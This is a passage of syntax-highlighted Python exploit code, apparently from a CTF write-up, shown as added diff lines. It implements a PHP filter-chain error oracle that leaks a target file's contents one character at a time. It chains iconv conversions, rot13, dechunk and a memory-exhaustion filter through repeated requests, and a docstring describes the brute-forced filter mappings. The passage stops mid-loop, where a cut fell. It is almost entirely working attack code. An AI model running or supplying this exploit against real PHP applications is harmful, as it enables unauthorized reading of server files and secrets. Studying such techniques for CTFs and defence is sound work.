+</span></span><span class=line><span class=cl><span class=nx>flip</span> <span class=o>=</span> <span class=s2>&#34;convert.quoted-printable-encode|convert.quoted-printable-encode|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.L1.utf7|convert.iconv.CSUNICODE.CSUNICODE|convert.iconv.UCS-4LE.10646-1:1993|convert.base64-decode|convert.base64-encode&#34;</span>
+</span></span><span class=line><span class=cl><span class=nx>r2</span> <span class=o>=</span> <span class=s2>&#34;convert.iconv.CSUNICODE.UCS-2BE&#34;</span>
+</span></span><span class=line><span class=cl><span class=nx>r4</span> <span class=o>=</span> <span class=s2>&#34;convert.iconv.UCS-4LE.10646-1:1993&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>get_nth</span><span class=p>(</span><span class=nx>n</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=nx>flip</span><span class=p>,</span> <span class=nx>r2</span><span class=p>,</span> <span class=nx>r4</span>
+</span></span><span class=line><span class=cl>    <span class=nx>o</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=nx>chunk</span> <span class=o>=</span> <span class=nx>n</span> <span class=c1>// 2
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=nx>chunk</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=o>:</span> <span class=nx>o</span><span class=o>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>r4</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>o</span><span class=o>.</span><span class=nx>extend</span><span class=p>([</span><span class=nx>flip</span><span class=p>,</span> <span class=nx>r4</span><span class=p>]</span> <span class=o>*</span> <span class=p>(</span><span class=nx>chunk</span> <span class=c1>// 2))
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span><span class=nx>n</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=o>^</span> <span class=p>(</span><span class=nx>chunk</span> <span class=o>%</span> <span class=mi>2</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span><span class=o>:</span> <span class=nx>o</span><span class=o>.</span><span class=nx>append</span><span class=p>(</span><span class=nx>r2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>join</span><span class=p>(</span><span class=o>*</span><span class=nx>o</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;
+</span></span></span><span class=line><span class=cl><span class=s2>Step 3:
+</span></span></span><span class=line><span class=cl><span class=s2>This is the longest but actually easiest part. We can use dechunk oracle to figure out if the first
+</span></span></span><span class=line><span class=cl><span class=s2>char is 0-9A-Fa-f. So it&#39;s just a matter of finding filters which translate to or from those
+</span></span></span><span class=line><span class=cl><span class=s2>chars. rot13 and string lower are helpful. There are probably a million ways to do this bit but
+</span></span></span><span class=line><span class=cl><span class=s2>I just bruteforced every combination of iconv filters to find these.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>Numbers are a bit trickier because iconv doesn&#39;t tend to touch them.
+</span></span></span><span class=line><span class=cl><span class=s2>In the CTF you coud porbably just guess from there once you have the letters. But if you actually 
+</span></span></span><span class=line><span class=cl><span class=s2>want a full leak you can base64 encode a third time and use the first two letters of the resulting
+</span></span></span><span class=line><span class=cl><span class=s2>string to figure out which number it is.
+</span></span></span><span class=line><span class=cl><span class=s2>&#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>rot1</span> <span class=o>=</span> <span class=s1>&#39;convert.iconv.437.CP930&#39;</span>
+</span></span><span class=line><span class=cl><span class=nx>be</span> <span class=o>=</span> <span class=s1>&#39;convert.quoted-printable-encode|convert.iconv..UTF7|convert.base64-decode|convert.base64-encode&#39;</span>
+</span></span><span class=line><span class=cl><span class=nx>o</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>def</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># a-f A-F 0-9
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># a-e
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>for</span> <span class=nx>n</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|&#39;</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|{be}|&#39;</span><span class=o>*</span><span class=p>(</span><span class=nx>n</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;edcba&#39;</span><span class=p>[</span><span class=nx>n</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># A-E
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>for</span> <span class=nx>n</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|&#39;</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|{be}|&#39;</span><span class=o>*</span><span class=p>(</span><span class=nx>n</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;EDCBA&#39;</span><span class=p>[</span><span class=nx>n</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.CSISO5427CYRILLIC.855|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;*&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># f
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=s1>&#39;f&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># F
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=s1>&#39;F&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># n-s N-S
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># n-r
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>for</span> <span class=nx>n</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|&#39;</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|{be}|&#39;</span><span class=o>*</span><span class=p>(</span><span class=nx>n</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;rqpon&#39;</span><span class=p>[</span><span class=nx>n</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.tolower|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># N-R
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>for</span> <span class=nx>n</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>5</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.tolower|&#39;</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|{be}|&#39;</span><span class=o>*</span><span class=p>(</span><span class=nx>n</span><span class=o>+</span><span class=mi>1</span><span class=p>)</span> <span class=o>+</span> <span class=nx>f</span><span class=s1>&#39;{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=s1>&#39;RQPON&#39;</span><span class=p>[</span><span class=nx>n</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>                    <span class=k>break</span>
+</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>                <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># s
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=s1>&#39;s&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1># S
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>return</span> <span class=s1>&#39;S&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|{rot1}|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># i j k
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;k&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;j&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;i&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|{rot1}|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># I J K
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;K&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;J&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;I&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># v w x
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;x&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;w&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;v&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># V W X
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;X&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;W&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=nx>elif</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|string.rot13|{rot1}|string.rot13|{be}|{rot1}|{be}|{rot1}|{be}|{rot1}|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s1>&#39;V&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Z
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;Z&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># z
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;z&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># M
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;M&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.toupper|convert.iconv.CP285.CP280|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># m
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># y
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;y&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># Y
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;Y&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># l
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;l&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|string.rot13|convert.iconv.CP273.CP1122|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># L
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;L&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># h
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;h&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># H
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;H&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># u
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;u&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.tolower|convert.iconv.500.1026|string.tolower|convert.iconv.437.CP930|string.rot13|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># U
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;U&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># g
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;g&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># G
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;G&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># t
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;t&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>elif</span> <span class=k>not</span> <span class=nx>req</span><span class=p>(</span><span class=nx>f</span><span class=s1>&#39;{prefix}|string.rot13|string.tolower|convert.iconv.CP1390.CSIBM932|dechunk|{blow_up_inf}&#39;</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># T
+</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>return</span> <span class=s1>&#39;T&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>        <span class=nx>err</span><span class=p>(</span><span class=s1>&#39;something wrong&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>print</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=k>for</span> <span class=nx>i</span> <span class=nx>in</span> <span class=nx>range</span><span class=p>(</span><span class=mi>100</span><span class=p>)</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>    <span class=nx>prefix</span> <span class=o>=</span> <span class=nx>f</span><span class=s1>&#39;{header}|{get_nth(i)}&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=nx>letter</span> <span class=o>=</span> <span class=nx>find_letter</span><span class=p>(</span><span class=nx>prefix</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=c1># it&#39;s a number! check base64
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=nx>letter</span> <span class=o>==</span> <span class=s1>&#39;*&#39;</span><span class=o>:</span>
